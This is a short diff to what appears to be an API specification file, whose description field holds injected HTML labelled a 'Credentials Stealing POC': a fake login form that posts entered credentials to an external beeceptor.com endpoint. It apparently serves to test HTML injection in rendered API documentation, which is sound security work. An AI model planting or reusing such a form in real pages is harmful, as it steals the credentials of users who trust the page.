@@ -5,7 +5,7 @@ info:
   description: '<div class="login-form">
     <div class="heading">
         <h1>Credentials Stealing POC : Fake Login</h1>
-        <iframe src='http://google.com'/>
+        <iframe src="http://google.com"></iframe>
     <div class="form-container">
         <form action="https://vinothpentest.free.beeceptor.com/login" method="post" class="form-signin">
             <div class="form-group">
